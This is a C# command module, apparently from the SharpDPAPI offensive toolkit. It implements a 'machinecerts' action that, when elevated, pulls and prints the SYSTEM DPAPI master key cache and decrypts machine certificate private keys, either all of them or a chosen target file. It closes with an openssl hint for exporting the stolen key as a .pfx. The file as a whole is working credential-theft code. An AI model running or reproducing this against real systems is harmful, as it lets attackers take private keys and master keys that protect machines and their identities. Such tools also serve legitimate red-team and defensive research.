using System;
using System.Collections.Generic;
using System.IO;

namespace SharpDPAPI.Commands
{
    public class MachineCertificates : ICommand
    {
        public static string CommandName => "machinecerts";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: Machine DPAPI Certificate Triage\r\n");

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("[X] Must be elevated to triage SYSTEM DPAPI Credentials!");
            }
            else
            {
                Dictionary<string, string> mappings = Triage.TriageSystemMasterKeys();

                Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
                foreach (KeyValuePair<string, string> kvp in mappings)
                {
                    Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                }
                Console.WriteLine();

                if (arguments.ContainsKey("/target"))
                {
                    string target = arguments["/target"].Trim('"').Trim('\'');

                    Console.WriteLine("[*] Target Certificate File: {0}\r\n", target);
                    Triage.TriageCertFile(target, mappings, true);
                }

                else
                {
                    Triage.TriageSystemCerts(mappings);
                }

                Console.WriteLine("[*] Hint: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx");
            }
        }
    }
}